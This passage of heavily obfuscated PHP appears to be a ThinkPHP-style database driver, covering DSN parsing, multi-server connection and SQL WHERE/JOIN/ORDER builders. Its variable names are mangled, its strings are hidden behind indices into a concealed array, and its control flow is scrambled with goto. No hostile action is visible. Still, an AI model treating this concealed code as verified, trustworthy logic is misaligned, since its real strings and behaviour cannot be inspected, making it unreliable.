$c√œÎµÈ¥∂ = array($dßåÁÉ≈…∑[920] => $c√œÎµÈ¥∂[$dßåÁÉ≈…∑[754]], $dßåÁÉ≈…∑[848] => $c√œÎµÈ¥∂[$dßåÁÉ≈…∑[925]], $dßåÁÉ≈…∑[849] => $c√œÎµÈ¥∂[$dßåÁÉ≈…∑[926]], $dßåÁÉ≈…∑[846] => $c√œÎµÈ¥∂[$dßåÁÉ≈…∑[927]], $dßåÁÉ≈…∑[847] => $c√œÎµÈ¥∂[$dßåÁÉ≈…∑[928]], $dßåÁÉ≈…∑[17] => $c√œÎµÈ¥∂[$dßåÁÉ≈…∑[929]], $dßåÁÉ≈…∑[875] => $c√œÎµÈ¥∂[$dßåÁÉ≈…∑[756]], $dßåÁÉ≈…∑[13] => isset($c√œÎµÈ¥∂[$dßåÁÉ≈…∑[930]]) ? $c√œÎµÈ¥∂[$dßåÁÉ≈…∑[930]] : array()); } elseif (empty($c√œÎµÈ¥∂)) { if (think_config($dßåÁÉ≈…∑[931]) && $dßåÁÉ≈…∑[755] != strtolower(think_config($dßåÁÉ≈…∑[932]))) { $c√œÎµÈ¥∂ = $this->parseDSN(think_config($dßåÁÉ≈…∑[931])); } else { $c√œÎµÈ¥∂ = array($dßåÁÉ≈…∑[920] => think_config($dßåÁÉ≈…∑[932]), $dßåÁÉ≈…∑[848] => think_config($dßåÁÉ≈…∑[933]), $dßåÁÉ≈…∑[849] => think_config($dßåÁÉ≈…∑[934]), $dßåÁÉ≈…∑[846] => think_config($dßåÁÉ≈…∑[935]), $dßåÁÉ≈…∑[847] => think_config($dßåÁÉ≈…∑[936]), $dßåÁÉ≈…∑[17] => think_config($dßåÁÉ≈…∑[244]), $dßåÁÉ≈…∑[875] => think_config($dßåÁÉ≈…∑[931]), $dßåÁÉ≈…∑[13] => think_config($dßåÁÉ≈…∑[937])); } } return $c√œÎµÈ¥∂; } protected function initConnect($b÷ÎéÙ‚Û€ = true) { if (1 == think_config($_SERVER[ú∫][18])) { $this->_linkID = $this->multiConnect($b÷ÎéÙ‚Û€); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $aÈû∫é¨Âˆ => $aÈÚ´¥áæí) { $this->_linkID = $aÈÚ´¥áæí; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($EÚ∫†ÑÇéÓ = false) { goto a¥Ö¡…ºã–; bñÀ‚ÒÓûÑ: if (empty($bÆÈÛï‡ãÖ)) { foreach ($this->config as $CÏ∏ÙéÂ∫ƒ => $CÃ◊ê£§¬˜) { $bÆÈÛï‡ãÖ[$CÏ∏ÙéÂ∫ƒ] = explode($FÊ√„ÿ’•ﬁ[47], $CÃ◊ê£§¬˜); } } if (think_config($FÊ√„ÿ’•ﬁ[938])) { if ($EÚ∫†ÑÇéÓ) { $E–Ù¶åƒ÷ù = floor(mt_rand(0, think_config($FÊ√„ÿ’•ﬁ[939]) - 1)); $bêƒ‡”˘ÎÖ = $E–Ù¶åƒ÷ù; } else { if (is_numeric(think_config($FÊ√„ÿ’•ﬁ[940]))) { $E–Ù¶åƒ÷ù = think_config($FÊ√„ÿ’•ﬁ[940]); } else { $E–Ù¶åƒ÷ù = floor(mt_rand(think_config($FÊ√„ÿ’•ﬁ[939]), count($bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[846]]) - 1)); } } } else { $E–Ù¶åƒ÷ù = floor(mt_rand(0, count($bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[846]]) - 1)); $bêƒ‡”˘ÎÖ = $E–Ù¶åƒ÷ù; } $E–Ù¶åƒ÷ù = $bêƒ‡”˘ÎÖ !== -1 ? $bêƒ‡”˘ÎÖ : $E–Ù¶åƒ÷ù; goto BÃ£Ü’∞î»; a¥Ö¡…ºã–: $FÊ√„ÿ’•ﬁ =& $_SERVER[ú∫]; static $bÆÈÛï‡ãÖ = array(); static $bêƒ‡”˘ÎÖ = -1; goto bñÀ‚ÒÓûÑ; BÃ£Ü’∞î»: $DÌê∞Ã‡Ëò = array($FÊ√„ÿ’•ﬁ[848] => isset($bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[848]][$E–Ù¶åƒ÷ù]) ? $bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[848]][$E–Ù¶åƒ÷ù] : $bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[848]][0], $FÊ√„ÿ’•ﬁ[849] => isset($bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[849]][$E–Ù¶åƒ÷ù]) ? $bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[849]][$E–Ù¶åƒ÷ù] : $bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[849]][0], $FÊ√„ÿ’•ﬁ[846] => isset($bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[846]][$E–Ù¶åƒ÷ù]) ? $bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[846]][$E–Ù¶åƒ÷ù] : $bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[846]][0], $FÊ√„ÿ’•ﬁ[847] => isset($bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[847]][$E–Ù¶åƒ÷ù]) ? $bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[847]][$E–Ù¶åƒ÷ù] : $bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[847]][0], $FÊ√„ÿ’•ﬁ[17] => isset($bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[17]][$E–Ù¶åƒ÷ù]) ? $bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[17]][$E–Ù¶åƒ÷ù] : $bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[17]][0], $FÊ√„ÿ’•ﬁ[875] => isset($bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[875]][$E–Ù¶åƒ÷ù]) ? $bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[875]][$E–Ù¶åƒ÷ù] : $bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[875]][0], $FÊ√„ÿ’•ﬁ[13] => isset($bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[13]][$E–Ù¶åƒ÷ù]) ? $bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[13]][$E–Ù¶åƒ÷ù] : $bÆÈÛï‡ãÖ[$FÊ√„ÿ’•ﬁ[13]][0]); return $this->connect($DÌê∞Ã‡Ëò, $E–Ù¶åƒ÷ù); goto A–µ›’ŒﬂË; A–µ›’ŒﬂË: } public function parseDSN($EÜ”´∆ˆ€ë) { $E‚ø°©•¬Ø =& $_SERVER[ú∫]; if (empty($EÜ”´∆ˆ€ë)) { return !1; } $A©⁄ÊÔäã = parse_url($EÜ”´∆ˆ€ë); if ($A©⁄ÊÔäã[$E‚ø°©•¬Ø[174]]) { $a‹Ì–®–Ë≠ = array($E‚ø°©•¬Ø[920] => $A©⁄ÊÔäã[$E‚ø°©•¬Ø[174]], $E‚ø°©•¬Ø[848] => isset($A©⁄ÊÔäã[$E‚ø°©•¬Ø[562]]) ? $A©⁄ÊÔäã[$E‚ø°©•¬Ø[562]] : $E‚ø°©•¬Ø[33], $E‚ø°©•¬Ø[849] => isset($A©⁄ÊÔäã[$E‚ø°©•¬Ø[941]]) ? $A©⁄ÊÔäã[$E‚ø°©•¬Ø[941]] : $E‚ø°©•¬Ø[33], $E‚ø°©•¬Ø[846] => isset($A©⁄ÊÔäã[$E‚ø°©•¬Ø[175]]) ? $A©⁄ÊÔäã[$E‚ø°©•¬Ø[175]] : $E‚ø°©•¬Ø[33], $E‚ø°©•¬Ø[847] => isset($A©⁄ÊÔäã[$E‚ø°©•¬Ø[176]]) ? $A©⁄ÊÔäã[$E‚ø°©•¬Ø[176]] : $E‚ø°©•¬Ø[33], $E‚ø°©•¬Ø[17] => isset($A©⁄ÊÔäã[$E‚ø°©•¬Ø[76]]) ? substr($A©⁄ÊÔäã[$E‚ø°©•¬Ø[76]], 1) : $E‚ø°©•¬Ø[33]); } else { preg_match($E‚ø°©•¬Ø[942], trim($EÜ”´∆ˆ€ë), $F…™É≠É≈ﬁ); $a‹Ì–®–Ë≠ = array($E‚ø°©•¬Ø[920] => $F…™É≠É≈ﬁ[1], $E‚ø°©•¬Ø[848] => $F…™É≠É≈ﬁ[2], $E‚ø°©•¬Ø[849] => $F…™É≠É≈ﬁ[3], $E‚ø°©•¬Ø[846] => $F…™É≠É≈ﬁ[4], $E‚ø°©•¬Ø[847] => $F…™É≠É≈ﬁ[5], $E‚ø°©•¬Ø[17] => $F…™É≠É≈ﬁ[6]); } $a‹Ì–®–Ë≠[$E‚ø°©•¬Ø[875]] = $E‚ø°©•¬Ø[33]; return $a‹Ì–®–Ë≠; } protected function debug() { $fÁ©ñﬂà Ë =& $_SERVER[ú∫]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $fÁ©ñﬂà Ë[943]; if (think_config($fÁ©ñﬂà Ë[944])) { think_status($fÁ©ñﬂà Ë[945]); think_trace($this->queryStr . $fÁ©ñﬂà Ë[946] . think_status($fÁ©ñﬂà Ë[20], $fÁ©ñﬂà Ë[945], 6) . $fÁ©ñﬂà Ë[947], $fÁ©ñﬂà Ë[33], $fÁ©ñﬂà Ë[948]); } } protected function parseLock($dÍ–•ïÂƒ∂ = false) { $c˘Æƒó…»å =& $_SERVER[ú∫]; if (!$dÍ–•ïÂƒ∂) { return $c˘Æƒó…»å[33]; } if ($c˘Æƒó…»å[877] == $this->dbType) { return $c˘Æƒó…»å[949]; } return $c˘Æƒó…»å[950]; } protected function parseSet($eîÛ£≈ó¯◊) { $d√öÉèÇ±ç =& $_SERVER[ú∫]; foreach ($eîÛ£≈ó¯◊ as $Fäû…⁄∫¬ò => $CÒÏßæ¢®€) { if (is_array($CÒÏßæ¢®€) && $d√öÉèÇ±ç[295] == $CÒÏßæ¢®€[0]) { $BÇ¬«∫™¿ß[] = $this->parseKey($Fäû…⁄∫¬ò) . $d√öÉèÇ±ç[951] . $CÒÏßæ¢®€[1]; } elseif (is_scalar($CÒÏßæ¢®€) || is_null($CÒÏßæ¢®€)) { $BÇ¬«∫™¿ß[] = $this->parseKey($Fäû…⁄∫¬ò) . $d√öÉèÇ±ç[951] . $this->parseValue($CÒÏßæ¢®€); } } return $d√öÉèÇ±ç[952] . implode($d√öÉèÇ±ç[47], $BÇ¬«∫™¿ß); } protected function bindParam($dÙŒ¬ƒ≥Ïú, $e≠âÊêÙüê) { $this->bind[$_SERVER[ú∫][4] . $dÙŒ¬ƒ≥Ïú] = $e≠âÊêÙüê; } protected function parseBind($aú”¥ü¶ÀÜ) { $aú”¥ü¶ÀÜ = array_merge($this->bind, $aú”¥ü¶ÀÜ); $this->bind = array(); return $aú”¥ü¶ÀÜ; } function parseKey(&$eîÌ√»Éô≤, $e≠¡Ôò˘Ÿ≤ = true) { if ($e≠¡Ôò˘Ÿ≤) { $eîÌ√»Éô≤ = $this->parseKeyCheck($eîÌ√»Éô≤); } return $eîÌ√»Éô≤; } function parseKeyCheck($bîÂ˘„Ω”Ò) { $E°Èƒﬁ∑üù =& $_SERVER[ú∫]; $bîÂ˘„Ω”Ò = trim($bîÂ˘„Ω”Ò); if (!preg_match($E°Èƒﬁ∑üù[953], $bîÂ˘„Ω”Ò)) { think_exception($E°Èƒﬁ∑üù[954] . $bîÂ˘„Ω”Ò); } return $bîÂ˘„Ω”Ò; } protected function parseValue($aÎıäÑ∂èñ) { $b¡¶úò“¶≤ =& $_SERVER[ú∫]; if (is_string($aÎıäÑ∂èñ)) { $aÎıäÑ∂èñ = $b¡¶úò“¶≤[916] . $this->escapeString($aÎıäÑ∂èñ) . $b¡¶úò“¶≤[916]; } elseif (isset($aÎıäÑ∂èñ[0]) && is_string($aÎıäÑ∂èñ[0]) && strtolower($aÎıäÑ∂èñ[0]) == $b¡¶úò“¶≤[295]) { $aÎıäÑ∂èñ = $this->escapeString($aÎıäÑ∂èñ[1]); } elseif (is_array($aÎıäÑ∂èñ)) { $aÎıäÑ∂èñ = array_map(array($this, $b¡¶úò“¶≤[917]), $aÎıäÑ∂èñ); } elseif (is_bool($aÎıäÑ∂èñ)) { $aÎıäÑ∂èñ = $aÎıäÑ∂èñ ? $b¡¶úò“¶≤[87] : $b¡¶úò“¶≤[191]; } elseif (is_null($aÎıäÑ∂èñ)) { $aÎıäÑ∂èñ = $b¡¶úò“¶≤[103]; } return $aÎıäÑ∂èñ; } protected function parseField($Cõ‚Ωºü›è) { $Dæî≠∂¬¯Ë =& $_SERVER[ú∫]; if (is_string($Cõ‚Ωºü›è) && strpos($Cõ‚Ωºü›è, $Dæî≠∂¬¯Ë[47])) { $Cõ‚Ωºü›è = explode($Dæî≠∂¬¯Ë[47], $Cõ‚Ωºü›è); } if (is_array($Cõ‚Ωºü›è)) { $eãÚœÀò´Ò = array(); foreach ($Cõ‚Ωºü›è as $EÑ‡Ú£ó¬ => $Cöﬂ¥èäÌù) { if (!is_numeric($EÑ‡Ú£ó¬)) { $eãÚœÀò´Ò[] = $this->parseKey($EÑ‡Ú£ó¬, !1) . $Dæî≠∂¬¯Ë[955] . $this->parseKey($Cöﬂ¥èäÌù); } else { $eãÚœÀò´Ò[] = $this->parseKey($Cöﬂ¥èäÌù); } } $eΩëèæêùî = implode($Dæî≠∂¬¯Ë[47], $eãÚœÀò´Ò); } elseif (is_string($Cõ‚Ωºü›è) && !empty($Cõ‚Ωºü›è)) { $eΩëèæêùî = $Cõ‚Ωºü›è; } else { $eΩëèæêùî = $Dæî≠∂¬¯Ë[182]; } return $eΩëèæêùî; } protected function parseTable($dçáﬂô«∫î) { $b‰ë…ÏÛÏı =& $_SERVER[ú∫]; if (is_array($dçáﬂô«∫î)) { $dÖŒø∏ê”∏ = array(); foreach ($dçáﬂô«∫î as $eÈƒØÕâ≈≥ => $eí©Ü«ìÑÑ) { if (!is_numeric($eÈƒØÕâ≈≥)) { $dÖŒø∏ê”∏[] = $this->parseKey($eÈƒØÕâ≈≥) . $b‰ë…ÏÛÏı[50] . $this->parseKey($eí©Ü«ìÑÑ); } else { $dÖŒø∏ê”∏[] = $this->parseKey($eÈƒØÕâ≈≥); } } $dçáﬂô«∫î = $dÖŒø∏ê”∏; } elseif (is_string($dçáﬂô«∫î)) { if (strstr($dçáﬂô«∫î, $b‰ë…ÏÛÏı[50])) { return $dçáﬂô«∫î; } $dçáﬂô«∫î = explode($b‰ë…ÏÛÏı[47], $dçáﬂô«∫î); array_walk($dçáﬂô«∫î, array($this, $b‰ë…ÏÛÏı[866])); } return $b‰ë…ÏÛÏı[860] . trim(implode($b‰ë…ÏÛÏı[956], $dçáﬂô«∫î), $b‰ë…ÏÛÏı[382]) . $b‰ë…ÏÛÏı[860]; } protected function parseWhere($CïÜ∑îÇèÛ) { $bù»öàÊºÓ =& $_SERVER[ú∫]; $c◊”…ôÕá“ = $bù»öàÊºÓ[33]; if (is_string($CïÜ∑îÇèÛ)) { $c◊”…ôÕá“ = $CïÜ∑îÇèÛ; } else { $Eﬁ√ãª¿Üç = isset($CïÜ∑îÇèÛ[$bù»öàÊºÓ[957]]) ? strtoupper($CïÜ∑îÇèÛ[$bù»öàÊºÓ[957]]) : $bù»öàÊºÓ[33]; if (in_array($Eﬁ√ãª¿Üç, array($bù»öàÊºÓ[958], $bù»öàÊºÓ[959], $bù»öàÊºÓ[960]))) { $Eﬁ√ãª¿Üç = $bù»öàÊºÓ[50] . $Eﬁ√ãª¿Üç . $bù»öàÊºÓ[50]; unset($CïÜ∑îÇèÛ[$bù»öàÊºÓ[957]]); } else { $Eﬁ√ãª¿Üç = $bù»öàÊºÓ[961]; } foreach ($CïÜ∑îÇèÛ as $BáÜÀäùÃ˘ => $FËéπ⁄≥á∞) { $c◊”…ôÕá“ .= $bù»öàÊºÓ[275]; if (is_numeric($BáÜÀäùÃ˘)) { $BáÜÀäùÃ˘ = $bù»öàÊºÓ[962]; } if (0 === strpos($BáÜÀäùÃ˘, $bù»öàÊºÓ[71])) { $c◊”…ôÕá“ .= $this->parseThinkWhere($BáÜÀäùÃ˘, $FËéπ⁄≥á∞); } else { if (!preg_match($bù»öàÊºÓ[963], trim($BáÜÀäùÃ˘))) { think_exception(think_lang($bù»öàÊºÓ[964]) . $bù»öàÊºÓ[4] . $BáÜÀäùÃ˘); } $bÀ›—¶¬ïÕ = is_array($FËéπ⁄≥á∞) && isset($FËéπ⁄≥á∞[$bù»öàÊºÓ[965]]); $BáÜÀäùÃ˘ = trim($BáÜÀäùÃ˘); if (strpos($BáÜÀäùÃ˘, $bù»öàÊºÓ[281])) { $c˘ô∫î¥åà = explode($bù»öàÊºÓ[281], $BáÜÀäùÃ˘); $EŸîÛ—Ÿ¯π = array(); foreach ($c˘ô∫î¥åà as $d”Î⁄òé•Ú => $Cã‰í’èî£) { $Eåº”ÍåÊÃ = $bÀ›—¶¬ïÕ ? $FËéπ⁄≥á∞[$d”Î⁄òé•Ú] : $FËéπ⁄≥á∞; $EŸîÛ—Ÿ¯π[] = $bù»öàÊºÓ[258] . $this->parseWhereItem($this->parseKey($Cã‰í’èî£), $Eåº”ÍåÊÃ) . $bù»öàÊºÓ[865]; } $c◊”…ôÕá“ .= implode($bù»öàÊºÓ[966], $EŸîÛ—Ÿ¯π); } elseif (strpos($BáÜÀäùÃ˘, $bù»öàÊºÓ[282])) { $c˘ô∫î¥åà = explode($bù»öàÊºÓ[282], $BáÜÀäùÃ˘); $EŸîÛ—Ÿ¯π = array(); foreach ($c˘ô∫î¥åà as $d”Î⁄òé•Ú => $Cã‰í’èî£) { $Eåº”ÍåÊÃ = $bÀ›—¶¬ïÕ ? $FËéπ⁄≥á∞[$d”Î⁄òé•Ú] : $FËéπ⁄≥á∞; $EŸîÛ—Ÿ¯π[] = $bù»öàÊºÓ[258] . $this->parseWhereItem($this->parseKey($Cã‰í’èî£), $Eåº”ÍåÊÃ) . $bù»öàÊºÓ[865]; } $c◊”…ôÕá“ .= implode($bù»öàÊºÓ[961], $EŸîÛ—Ÿ¯π); } else { $c◊”…ôÕá“ .= $this->parseWhereItem($this->parseKey($BáÜÀäùÃ˘), $FËéπ⁄≥á∞); } } $c◊”…ôÕá“ .= $bù»öàÊºÓ[276] . $Eﬁ√ãª¿Üç; } $c◊”…ôÕá“ = substr($c◊”…ôÕá“, 0, -strlen($Eﬁ√ãª¿Üç)); } return empty($c◊”…ôÕá“) ? $bù»öàÊºÓ[33] : $bù»öàÊºÓ[967] . $c◊”…ôÕá“; } protected function parseWhereItem($fåÚã´Æﬁ÷, $eãÒñÎπçò) { $C‘ƒ∑∏∑•ä =& $_SERVER[ú∫]; $e®‚ãéù–  = $C‘ƒ∑∏∑•ä[33]; if (is_array($eãÒñÎπçò)) { if (is_string($eãÒñÎπçò[0])) { $b£«ÿàÛ∆Ü = strtolower($eãÒñÎπçò[0]); if (in_array($eãÒñÎπçò[0], array($C‘ƒ∑∏∑•ä[951], $C‘ƒ∑∏∑•ä[968], $C‘ƒ∑∏∑•ä[969], $C‘ƒ∑∏∑•ä[970], $C‘ƒ∑∏∑•ä[971], $C‘ƒ∑∏∑•ä[972]))) { $e®‚ãéù–  .= $fåÚã´Æﬁ÷ . $C‘ƒ∑∏∑•ä[50] . $eãÒñÎπçò[0] . $C‘ƒ∑∏∑•ä[50] . $this->parseValue($eãÒñÎπçò[1]); } elseif (preg_match($C‘ƒ∑∏∑•ä[973], $eãÒñÎπçò[0])) { $e®‚ãéù–  .= $fåÚã´Æﬁ÷ . $C‘ƒ∑∏∑•ä[50] . $this->exp[$b£«ÿàÛ∆Ü] . $C‘ƒ∑∏∑•ä[50] . $this->parseValue($eãÒñÎπçò[1]); } elseif (preg_match($C‘ƒ∑∏∑•ä[974], $eãÒñÎπçò[0])) { if (is_array($eãÒñÎπçò[1])) { $fç⁄¶æˆÂ≤ = isset($eãÒñÎπçò[2]) ? strtoupper($eãÒñÎπçò[2]) : $C‘ƒ∑∏∑•ä[959]; if (in_array($fç⁄¶æˆÂ≤, array($C‘ƒ∑∏∑•ä[958], $C‘ƒ∑∏∑•ä[959], $C‘ƒ∑∏∑•ä[960]))) { $b·ºòèøÎî = array(); foreach ($eãÒñÎπçò[1] as $D≠àÓÜ©¬Ù) { $b·ºòèøÎî[] = $fåÚã´Æﬁ÷ . $C‘ƒ∑∏∑•ä[50] . $this->exp[$b£«ÿàÛ∆Ü] . $C‘ƒ∑∏∑•ä[50] . $this->parseValue($D≠àÓÜ©¬Ù); } $e®‚ãéù–  .= $C‘ƒ∑∏∑•ä[258] . implode($C‘ƒ∑∏∑•ä[50] . $fç⁄¶æˆÂ≤ . $C‘ƒ∑∏∑•ä[50], $b·ºòèøÎî) . $C‘ƒ∑∏∑•ä[865]; } } else { $e®‚ãéù–  .= $fåÚã´Æﬁ÷ . $C‘ƒ∑∏∑•ä[50] . $this->exp[$b£«ÿàÛ∆Ü] . $C‘ƒ∑∏∑•ä[50] . $this->parseValue($eãÒñÎπçò[1]); } } elseif ($C‘ƒ∑∏∑•ä[295] == $b£«ÿàÛ∆Ü) { $e®‚ãéù–  .= $C‘ƒ∑∏∑•ä[863] . $fåÚã´Æﬁ÷ . $C‘ƒ∑∏∑•ä[50] . $eãÒñÎπçò[1] . $C‘ƒ∑∏∑•ä[975]; } elseif (preg_match($C‘ƒ∑∏∑•ä[976], $eãÒñÎπçò[0])) { $e®‚ãéù–  .= $eãÒñÎπçò[0]; } elseif (preg_match($C‘ƒ∑∏∑•ä[977], $eãÒñÎπçò[0])) { if (isset($eãÒñÎπçò[2]) && $C‘ƒ∑∏∑•ä[295] == $eãÒñÎπçò[2]) { $e®‚ãéù–  .= $fåÚã´Æﬁ÷ . $C‘ƒ∑∏∑•ä[50] . $this->exp[$b£«ÿàÛ∆Ü] . $C‘ƒ∑∏∑•ä[50] . $eãÒñÎπçò[1]; } else { if (is_string($eãÒñÎπçò[1])) { $eãÒñÎπçò[1] = explode($C‘ƒ∑∏∑•ä[47], $eãÒñÎπçò[1]); } $Aùﬂﬂïº«À = implode($C‘ƒ∑∏∑•ä[47], $this->parseValue($eãÒñÎπçò[1])); $e®‚ãéù–  .= $fåÚã´Æﬁ÷ . $C‘ƒ∑∏∑•ä[50] . $this->exp[$b£«ÿàÛ∆Ü] . $C‘ƒ∑∏∑•ä[863] . $Aùﬂﬂïº«À . $C‘ƒ∑∏∑•ä[865]; } } elseif (preg_match($C‘ƒ∑∏∑•ä[978], $eãÒñÎπçò[0])) { $f∂ﬂéÂ™πÆ = is_string($eãÒñÎπçò[1]) ? explode($C‘ƒ∑∏∑•ä[47], $eãÒñÎπçò[1]) : $eãÒñÎπçò[1]; $e®‚ãéù–  .= $C‘ƒ∑∏∑•ä[863] . $fåÚã´Æﬁ÷ . $C‘ƒ∑∏∑•ä[50] . $this->exp[$b£«ÿàÛ∆Ü] . $C‘ƒ∑∏∑•ä[50] . $this->parseValue($f∂ﬂéÂ™πÆ[0]) . $C‘ƒ∑∏∑•ä[961] . $this->parseValue($f∂ﬂéÂ™πÆ[1]) . $C‘ƒ∑∏∑•ä[276]; } else { think_exception(think_lang($C‘ƒ∑∏∑•ä[964]) . $C‘ƒ∑∏∑•ä[4] . $eãÒñÎπçò[0]); } } else { $aﬂ†ëÇ–ò° = count($eãÒñÎπçò); $eÊ·£ª©•˜ = $C‘ƒ∑∏∑•ä[33]; if (is_string($eãÒñÎπçò[$aﬂ†ëÇ–ò° - 1])) { $eÊ·£ª©•˜ = isset($eãÒñÎπçò[$aﬂ†ëÇ–ò° - 1]) ? strtoupper($eãÒñÎπçò[$aﬂ†ëÇ–ò° - 1]) : $C‘ƒ∑∏∑•ä[33]; if (in_array($eÊ·£ª©•˜, array($C‘ƒ∑∏∑•ä[958], $C‘ƒ∑∏∑•ä[959], $C‘ƒ∑∏∑•ä[960]))) { $aﬂ†ëÇ–ò° = $aﬂ†ëÇ–ò° - 1; } } else { $eÊ·£ª©•˜ = $C‘ƒ∑∏∑•ä[958]; } for ($CöÔ≤€âÂ∏ = 0; $CöÔ≤€âÂ∏ < $aﬂ†ëÇ–ò°; $CöÔ≤€âÂ∏++) { $f∂ﬂéÂ™πÆ = is_array($eãÒñÎπçò[$CöÔ≤€âÂ∏]) ? $eãÒñÎπçò[$CöÔ≤€âÂ∏][1] : $eãÒñÎπçò[$CöÔ≤€âÂ∏]; if ($C‘ƒ∑∏∑•ä[295] == strtolower($eãÒñÎπçò[$CöÔ≤€âÂ∏][0])) { $e®‚ãéù–  .= $C‘ƒ∑∏∑•ä[258] . $fåÚã´Æﬁ÷ . $C‘ƒ∑∏∑•ä[50] . $f∂ﬂéÂ™πÆ . $C‘ƒ∑∏∑•ä[975] . $eÊ·£ª©•˜ . $C‘ƒ∑∏∑•ä[50]; } else { $eì»”Æ«ﬂø = is_array($eãÒñÎπçò[$CöÔ≤€âÂ∏]) ? $this->exp[strtolower($eãÒñÎπçò[$CöÔ≤€âÂ∏][0])] : $C‘ƒ∑∏∑•ä[951]; if (!$eì»”Æ«ﬂø && is_array($eãÒñÎπçò[$CöÔ≤€âÂ∏]) && in_array($eãÒñÎπçò[$CöÔ≤€âÂ∏][0], array($C‘ƒ∑∏∑•ä[951], $C‘ƒ∑∏∑•ä[968], $C‘ƒ∑∏∑•ä[969], $C‘ƒ∑∏∑•ä[970], $C‘ƒ∑∏∑•ä[971], $C‘ƒ∑∏∑•ä[972]))) { $eì»”Æ«ﬂø = $eãÒñÎπçò[$CöÔ≤€âÂ∏][0]; } $e®‚ãéù–  .= $C‘ƒ∑∏∑•ä[258] . $fåÚã´Æﬁ÷ . $C‘ƒ∑∏∑•ä[50] . $eì»”Æ«ﬂø . $C‘ƒ∑∏∑•ä[50] . $this->parseValue($f∂ﬂéÂ™πÆ) . $C‘ƒ∑∏∑•ä[975] . $eÊ·£ª©•˜ . $C‘ƒ∑∏∑•ä[50]; } } $e®‚ãéù–  = substr($e®‚ãéù– , 0, -4); } } else { $e®‚ãéù–  .= $fåÚã´Æﬁ÷ . $C‘ƒ∑∏∑•ä[979] . $this->parseValue($eãÒñÎπçò); } return $e®‚ãéù– ; } protected function parseThinkWhere($F≈”òº™ŒÑ, $E…∂ÛËÛ´) { $c∑Êî∑Ò‰É =& $_SERVER[ú∫]; $Eπ»ôëΩ“â = $c∑Êî∑Ò‰É[33]; switch ($F≈”òº™ŒÑ) { case $c∑Êî∑Ò‰É[350]: $Eπ»ôëΩ“â = $E…∂ÛËÛ´; break; case $c∑Êî∑Ò‰É[962]: $Eπ»ôëΩ“â = is_string($E…∂ÛËÛ´) ? $E…∂ÛËÛ´ : substr($this->parseWhere($E…∂ÛËÛ´), 6); break; case $c∑Êî∑Ò‰É[980]: parse_str($E…∂ÛËÛ´, $dö›ÂµÛ±ã); if (isset($dö›ÂµÛ±ã[$c∑Êî∑Ò‰É[957]])) { $e…˜¢º›¢£ = $c∑Êî∑Ò‰É[50] . strtoupper($dö›ÂµÛ±ã[$c∑Êî∑Ò‰É[957]]) . $c∑Êî∑Ò‰É[50]; unset($dö›ÂµÛ±ã[$c∑Êî∑Ò‰É[957]]); } else { $e…˜¢º›¢£ = $c∑Êî∑Ò‰É[961]; } $E©π”Õﬁ‚å = array(); foreach ($dö›ÂµÛ±ã as $a‰£¯ „€∆ => $E≤âÌãáı±) { $E©π”Õﬁ‚å[] = $this->parseKey($a‰£¯ „€∆) . $c∑Êî∑Ò‰É[979] . $this->parseValue($E≤âÌãáı±); } $Eπ»ôëΩ“â = implode($e…˜¢º›¢£, $E©π”Õﬁ‚å); break; } return $Eπ»ôëΩ“â; } protected function parseLimit($Aıú÷ÿÙ›ì) { $CúóããøÙÑ =& $_SERVER[ú∫]; return !empty($Aıú÷ÿÙ›ì) ? $CúóããøÙÑ[48] . $Aıú÷ÿÙ›ì . $CúóããøÙÑ[50] : $CúóããøÙÑ[33]; } protected function parseJoin($d˜ô¯çÆﬂâ) { $B™…Ñ‰èΩ° =& $_SERVER[ú∫]; $fÉ€¬Ÿ«ÁΩ = $B™…Ñ‰èΩ°[33]; if (!empty($d˜ô¯çÆﬂâ)) { if (is_array($d˜ô¯çÆﬂâ)) { foreach ($d˜ô¯çÆﬂâ as $a∑ΩöΩ∑‘∞ => $FÊÆáåﬂÛ) { if (!1 !== stripos($FÊÆáåﬂÛ, $B™…Ñ‰èΩ°[981])) { $fÉ€¬Ÿ«ÁΩ .= $B™…Ñ‰èΩ°[50] . $FÊÆáåﬂÛ; } else { $fÉ€¬Ÿ«ÁΩ .= $B™…Ñ‰èΩ°[982] . $FÊÆáåﬂÛ; } } } else { $fÉ€¬Ÿ«ÁΩ .= $B™…Ñ‰èΩ°[982] . $d˜ô¯çÆﬂâ; } } $fÉ€¬Ÿ«ÁΩ = preg_replace($B™…Ñ‰èΩ°[983], think_config($B™…Ñ‰èΩ°[889]) . $B™…Ñ‰èΩ°[984], $fÉ€¬Ÿ«ÁΩ); return $fÉ€¬Ÿ«ÁΩ; } protected function parseOrder($fÔÖıÆâÊ§) { $FçÛâ»Ìà∏ =& $_SERVER[ú∫]; if (is_array($fÔÖıÆâÊ§)) { $bäÉÕô´⁄‰ = array(); foreach ($fÔÖıÆâÊ§ as $dæ‰‚ª∆´ => $dãôìÖÈ“ó) { if (is_numeric($dæ‰‚ª∆´)) { $bäÉÕô´⁄‰[] = $this->parseKey($dãôìÖÈ“ó); } else { $dãôìÖÈ“ó 